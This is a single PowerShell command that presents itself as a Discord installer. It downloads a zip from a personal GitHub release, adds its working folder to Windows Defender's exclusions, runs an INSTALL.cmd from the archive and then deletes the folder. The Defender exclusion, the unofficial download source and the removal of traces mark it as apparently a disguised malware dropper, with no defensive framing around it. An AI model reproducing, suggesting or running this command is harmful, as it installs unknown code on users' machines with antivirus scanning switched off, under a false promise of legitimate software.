$p="C:\phwyverysad"; $u="https://github.com/phwyverysad/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Discord.zip"; $z="$p\ds.zip"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item $p -Type Directory | Out-Null}; Add-MpPreference -ExclusionPath $p -EA 0; try{Write-Host "Downloading Discord..."; (New-Object System.Net.WebClient).DownloadFile($u,$z); if(Test-Path $z){Write-Host "Extracting..."; Expand-Archive $z $p -Force; $c=Get-ChildItem $p -Filter "INSTALL.cmd" -Recurse | Select -First 1; if($c){Write-Host "Installing..."; Start-Process $c.FullName -WorkingDirectory $c.DirectoryName -Wait}else{Write-Host "Error: INSTALL.cmd not found"}}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 3; if(Test-Path $p){Remove-Item $p -Recurse -Force -EA 0}; $ProgressPreference=$oldP; Write-Host "Done."}
